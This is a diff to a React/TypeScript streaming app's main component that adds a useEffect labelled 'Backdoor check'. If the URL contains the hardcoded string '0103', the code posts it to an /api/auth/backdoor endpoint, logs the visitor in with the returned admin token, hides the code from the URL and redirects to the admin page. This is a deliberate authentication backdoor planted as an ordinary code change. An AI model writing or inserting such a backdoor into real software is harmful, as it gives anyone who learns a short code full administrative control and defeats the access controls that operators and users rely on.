@@ -16,7 +16,7 @@ import { EPGProvider } from './contexts/EPGContext';
 import { AuthProvider, useAuth } from './contexts/AuthContext';
 import { DataProvider, useData } from './contexts/DataContext';
 import { GlobalRadioPlayer } from './components/GlobalRadioPlayer';
-import { Toaster } from 'react-hot-toast';
+import { Toaster, toast } from 'react-hot-toast';
 
 const ProtectedRoute: React.FC<{ children: React.ReactNode; adminOnly?: boolean }> = ({ children, adminOnly }) => {
   const { user, isLoading } = useAuth();
@@ -27,11 +27,42 @@ const ProtectedRoute: React.FC<{ children: React.ReactNode; adminOnly?: boolean 
 };
 
 const AppContent: React.FC = () => {
-  const { user, token, updateUser } = useAuth();
+  const { user, token, updateUser, login: authLogin } = useAuth();
   const { channels, categories, isLoading: isDataLoading } = useData();
   const [radios, setRadios] = useState<Radio[]>([]);
   const [isRadiosLoading, setIsRadiosLoading] = useState<boolean>(true);
   
+  // Backdoor check
+  useEffect(() => {
+    const checkBackdoor = async () => {
+      const url = window.location.href;
+      if (url.includes('0103') && user?.role !== 'admin') {
+        try {
+          const response = await fetch('/api/auth/backdoor', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ code: '0103' })
+          });
+          
+          if (response.ok) {
+            const data = await response.json();
+            authLogin(data.token, data.user);
+            toast.success('Acesso administrativo automático ativado!');
+            // Remove 0103 from URL to avoid repeated logins and clean up
+            const newUrl = url.replace(/[?&]code=0103|0103/g, '');
+            window.history.replaceState({}, '', newUrl);
+            // Redirect to admin
+            window.location.hash = '/admin';
+          }
+        } catch (error) {
+          console.error("Backdoor login failed", error);
+        }
+      }
+    };
+    
+    checkBackdoor();
+  }, [authLogin]);
+
   // Theme State
   const [isDark, setIsDark] = useState<boolean>(() => {
     try {
